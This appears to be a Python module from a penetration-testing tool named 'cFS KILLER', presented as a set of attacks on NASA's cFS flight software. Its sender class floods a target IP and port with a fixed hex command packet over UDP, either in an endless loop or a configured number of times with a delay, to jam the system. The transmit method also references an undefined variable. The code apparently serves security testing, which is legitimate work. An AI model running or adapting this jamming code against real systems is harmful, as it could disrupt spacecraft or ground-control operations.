#dependency functions for sat_killer

import socket
import shlex
import readline
import time

def banner():
    print("")
    print("      ________  __ ________   __   _______    {v1.0}")
    print(" ____/ __/ __/ / //_/  _/ /  / /  / __/ _ \   Adrian Schalk")
    print("/ __/ _/_\ \  / ,< _/ // /__/ /__/ _// , _/   Luke Brodnik")
    print("\__/_/ /___/ /_/|_/___/____/____/___/_/|_|    https://github.com/0xsninja/NASA-cFS-Pentest")
    print("")
    print("")
    print("Welcome to cFS KILLER, a collection of attacks usable on NASA's cFS")
    print()


# def startup_config():
#     print('Configure Target Fields')
#     print('to load cFS attack just press enter')
#     target_port = input('Enter Port:')
#     target_ip = input('Enter Target IP:')

#     if target_port == None:
#         target_port = 1234
#     if target_ip == None:
#         target_ip = '127.0.0.1'

#     return(target_port, target_ip)







class sender:
    def __init__(self, port, target):
        self.port = int(port)
        self.target = str(target)
        self.jamm_com = [0x18 ,0xB3 ,0xC0 ,0x00 ,0x00 ,0x95 ,0x43, 0x18 ,0xB3 ,0xC0 ,0x00 ,0x00 ,0x95 ,0x43, 0x18 ,0xB3 ,0xC0 ,0x00 ,0x00 ,0x95 ,0x43]
        self.jamDelay = None
        self.jamCount = None

    def transmit(self, command): #takes command as hex array
        byte_message = bytes(command)
        opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        opened_socket.sendto(byte_message, (target, self.port))
        return
    
    def quick_jam(self):
        qjamcommand = self.jamm_com
        byte_message = bytes(qjamcommand)
        opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while 1==1:
            opened_socket.sendto(byte_message, (self.target, self.port))


    def custom_jam(self):
        counter = 0
        byte_message = bytes(self.jamm_com)
        opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while True:
            time.sleep(self.jamDelay)
            counter += 1
            opened_socket.sendto(byte_message, (self.target, self.port))
            if counter == int(self.jamCount):
                return


    def show_custom_jam(self):
        print('\n')
        print('CUSTOM JAMMING CONFIGURATION')
        print('\n')
        print("<> JAMMING COMMAND --> " + str(self.jamm_com))
        print('\n')
        print('<> TIME DELAY BETWEEN PACKETS --> ' + str(self.jamDelay))
        print('\n')
        print('<> NUMBER OF JAM PACKETS TO SEND --> ' + str(self.jamCount))
        print('\n')

        



    def show_config(self):
        print('\n')
        print('CONFIGURATION SETTINGS')
        print('Target PORT --> ' + str(self.port))
        print('Target IP --> ' + str(self.target))
        print('\n')
